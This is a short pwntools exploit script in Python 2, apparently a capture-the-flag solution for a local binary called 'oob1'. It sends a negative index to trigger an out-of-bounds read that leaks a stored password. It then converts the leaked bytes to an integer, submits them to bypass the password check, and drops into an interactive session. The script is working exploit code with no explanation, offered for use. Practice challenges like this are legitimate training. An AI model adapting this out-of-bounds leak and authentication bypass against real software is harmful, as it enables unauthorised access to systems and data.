from pwn import *
sh=process("./oob1")
sh.sendline("-4")
sh.sendline("1234") #input everything randomly

sh.recvuntil("to [")
pw=sh.recvuntil("g+]",drop=True)
print "password in bytes = [" + pw + "]"
pw=u32(str(pw))
print "password in int =" + str(pw)

sh.sendline("0")
sh.sendline(str(pw))
sh.interactive()

